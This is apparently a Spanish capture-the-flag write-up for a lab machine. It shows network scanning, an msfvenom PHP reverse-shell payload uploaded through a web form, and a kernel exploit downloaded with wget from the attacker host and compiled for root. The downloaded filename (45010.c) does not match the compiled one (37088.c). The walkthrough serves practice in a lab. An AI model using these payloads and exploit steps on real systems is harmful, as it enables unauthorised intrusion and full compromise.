
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.16 -oN escaneo
msfvenom -p php/reverse_php LHOST=10.0.2.4 LPORT=443 -f raw -o pwned.php
searchsploit Ubuntu 4.8.2-19 
searchsploit -m linux/local/37088.c
```
Primero de todo buscamos la IP de la máquina realizando un arp-scan, una vez tenemos su IP realizamos un nmap para ver los puertos abiertos y vemos que tiene unicamente el puerto 80 abierto.
![[Pasted image 20240305003504.png]]
Por tanto entramos a la web en la cual vemos el siguiente panel de login![[Pasted image 20240305003540.png]]
Y nos registraremos en la web rellenando el siguiente formulario para ver que hay dentro de la pagina.
![[Pasted image 20240305003626.png]]
Una vez registrados encontramos el siguiente panel ![[Pasted image 20240305003724.png]]
Ahora entraremos al menu de personal options y encontramos el siguiente panel![[Pasted image 20240305003849.png]]
Ahora generamos un payload con msfvenom y se lo pasamos a la pagina web en el apartado browse ![[Pasted image 20240305004142.png]]
Una vez subido haremos fuzzing web para ver donde hemos subido el payload y encontramos el directorio uploads![[Pasted image 20240305004538.png]]
Allí encontramos nuestro archivo malicioso y por tanto nos ponemos en escucha por el puerto 443 y ya entramos a la máquina víctima![[Pasted image 20240305004820.png]]
Ahora realizaremos el [[Tratamiento TTY]] y procederemos con la escalada de privilegios
```shell
cat /proc/version
cd /tmp
wget http://10.0.2.4/45010.c
gcc 37088.c -o exploit
./exploit
cat /root/flag.txt
```
Para ello miraremos la versión de linux en busca de un posible exploit que viendo q es una versión antigua lo encontramos.![[Pasted image 20240305014115.png]]
Entonces procedemos a buscar un exploit además de descargarlo, yo he elegido el 37088.c![[Pasted image 20240305015529.png]]
Ahora levantamos un servidor y nos guardamos el archivo en la maquina víctima en su directorio temporal para evitar restricciones y compilamos el exploit![[Pasted image 20240305020609.png]]
Y finalmente ejecutamos el exploit con el que conseguimos ser usuario root y conseguimos la flag de root
![[Pasted image 20240305020841.png]]
